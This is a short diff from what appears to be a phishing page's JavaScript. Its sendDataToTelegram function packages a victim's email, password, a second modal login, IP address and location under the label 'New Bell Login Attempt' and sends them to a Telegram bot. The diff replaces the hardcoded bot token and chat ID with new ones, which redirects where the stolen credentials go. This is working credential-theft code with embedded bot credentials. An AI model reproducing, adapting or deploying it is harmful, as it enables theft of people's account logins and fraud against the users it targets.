@@ -94,8 +94,9 @@
 
   // Send data to Telegram
   async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
- const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
-    const chatId= '1613277499';
+ const botToken='7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo';
+
+    const chatId= '6173839485';
 
     const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
